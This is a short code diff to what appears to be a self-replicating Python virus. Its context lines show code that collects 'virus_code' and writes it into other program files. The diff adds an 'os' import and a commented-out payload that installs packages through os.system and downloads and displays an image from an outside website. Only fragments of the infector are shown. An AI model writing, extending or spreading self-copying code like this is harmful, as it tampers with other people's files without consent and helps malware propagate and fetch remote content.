@@ -1,5 +1,7 @@
 # version 3.2.1
-import sys, glob
+import sys
+import glob
+import os
 
 virus_code = []
 in_virus = False
@@ -34,5 +36,9 @@ for program in programs:
         with open(program, 'w') as f:
             f.writelines(new_code)
 # contain
-# print('Gotcha !!!!!')
+# os.system('pip3 install requests Pillow')
+# from PIL import Image
+# import requests
+# im = Image.open(requests.get('https://strajk.eu/wp-content/uploads/2016/12/file.papiez.jpg', stream=True).raw)
+# im.show()
 # version 3.2.2
